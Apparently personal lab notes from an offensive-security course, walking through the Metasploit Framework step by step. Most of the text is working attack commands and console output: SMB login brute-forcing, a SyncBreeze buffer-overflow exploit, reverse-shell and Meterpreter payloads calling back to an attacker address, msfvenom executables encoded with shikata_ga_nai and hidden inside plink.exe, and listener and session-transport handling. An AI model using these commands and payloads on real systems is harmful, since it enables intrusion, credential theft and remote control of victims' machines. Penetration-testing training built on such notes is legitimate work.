#### Metasploit Framework

```
sudo systemctl start postgresql

sudo systemctl enable postgresql

sudo msfdb init

sudo apt update; sudo apt install metasploit-framework

sudo msfconsole -q

```

##### MSF syntax

```
show -h

use auxiliary/scanner/portscan/tcp

back

use auxiliary/scanner/portscan/tcp

use auxiliary/scanner/portscan/syn

previous

show options

set RHOSTS 192.168.119.175

run

```
##### Metasploit Database Access

```
services

services -h

db_nmap

db_nmap 192.168.119.175 -A -Pn

hosts

services -p 445

workspace

workspace test

workspace -a tada

workspace -d tada

```

##### Auxiliary

```
show auxiliary

search -h

search type:auxiliary name:smb

use scanner/smb/smb2

info

run

services -p 445 --rhosts

use scanner/smb/smb_login

options

set SMBDomain corp.com

set SMBUser Offsec

set SMBPass ABCDEFG123!

setg RHOSTS 10.11.0.22

set THREADS 10

set THREADS 10

run

set SMBPass Qwerty09!

run

creds

set USERPASS_FILE /home/kali/users.txt # file containing users and passwords separated by space

run

use scanner/rdp/rdp_scanner

show options

set RHOSTS 10.11.0.22

run

```

##### Exploit Modules

```
search syncbreeze

info exploit/windows/http/syncbreeze_bof

use exploit/windows/http/syncbreeze_bof

show payloads

set payload windows/shell_reverse_tcp

show options

set LHOST 192.168.175.10

set RHOST 192.168.119.175

check

exploit

```

##### Metasploit Payloads

###### Staged vs Non-Staged Payloads

```
windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell 
windows/shell/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged)

```

###### Meterpreter Payloads

```

search meterpreter type:payload

set payload windows/meterpreter/reverse_http

set LHOST 192.168.119.175

show options

exploit


```

###### Experimenting with Meterpreter

```
meterpreter> help

sysinfo

getuid

upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec

download c:\\Windows\\system32\\calc.exe /tmp/calc.exe

shell

ftp 127.0.0.1

shell

exit

```

There are other payloads that have use cases in specific situations like vncinject/reverse_http, which creates a reverse VNC713 graphical connection or php/reverse_php, which is a reverse shell written entirely in PHP that can be used to exploit a PHP web application. More exotic payloads also exist like mainframe/reverse_shell_jcl, which is a reverse shellcode for a Z/OS mainframe.


###### Executable Payloads - msfvenom

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -o shell_reverse.exe

file shell_reverse.exe

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe



```

The process in msfconsole

```
msf5 > use payload/windows/shell_reverse_tcp

msf5 payload(windows/shell_reverse_tcp) > set LHOST 10.11.0.4
LHOST => 10.11.0.4

msf5 payload(windows/shell_reverse_tcp) > set LPORT 443 LPORT => 443

msf5 payload(windows/shell_reverse_tcp) > generate -f exe -e x86/shikata_ga_nai -i 9 - x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
[*] Writing 311296 bytes to shell_reverse_msf_encoded_embedded.exe...

```
###### Metasploit Exploit Multi Handler

```

use multi/handler

set payload windows/meterpreter/reverse_https

show options

set LHOST 192.168.119.175

set LPORT 443

exploit

exploit -j

jobs

jobs -i 0

kill 0

```

###### Client Side Attacks

```

msfvenom -l formats

msf5> search flash

```

Advanced features - 

Encoding

```
msf5 exploit(multi/handler) > show advanced

set EnableStageEncoding true

set StageEncoder x86/shikata_ga_nai

exploit -j

```
AutoRunScript

```
msf5 exploit(multi/handler) > set AutoRunScript windows/gather/enum_logged_on_users

exploit -j

```

```
meterpreter > background

msf5 exploit(multi/handler) > sessions -l

session -i 5

meterpreter > transport list

transport add -t reverse_tcp -l 10.11.0.4 -p 5555

transport list


```

we can use Meterpreter payload transports716 to switch protocols after our initial compromise. We can list the currently available transports for the meterpreter connection with transport list.


Before we can take advantage of the new transport, we must set up a listener to accept the connection. We’ll do this by once again selecting the multi/handler module and specifying the same parameters we selected earlier.
With the handler configured, we can return to the meterpreter session and run transport next to change to the newly-created transport mode. This will create a new session and close down the old one.

```
meterpreter > background
[*] Backgrounding session 5...

msf5 exploit(windows/http/syncbreeze_bof) > use multi/handler

msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > set LHOST 10.11.0.4 LHOST => 10.11.0.4

msf5 exploit(multi/handler) > set LPORT 5555 LPORT => 5555

msf5 exploit(multi/handler) > exploit -j [*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.11.0.4:5555

msf5 exploit(multi/handler) > sessions -i 5 [*] Starting interaction with 5...
meterpreter > transport next
[*] Changing to next transport ...

[*] Sending stage (179779 bytes) to 10.11.0.22
[+] Successfully changed to the next transport, killing current session.

[*] 10.11.0.22 - Meterpreter session 5 closed. Reason: User exit

msf5 exploit(multi/handler) >
[*] Meterpreter session 6 opened (10.11.0.4:5555 -> 10.11.0.22:50357)

msf5 exploit(multi/handler) > sessions -i 6 
[*] Starting interaction with 6...

meterpreter >

```
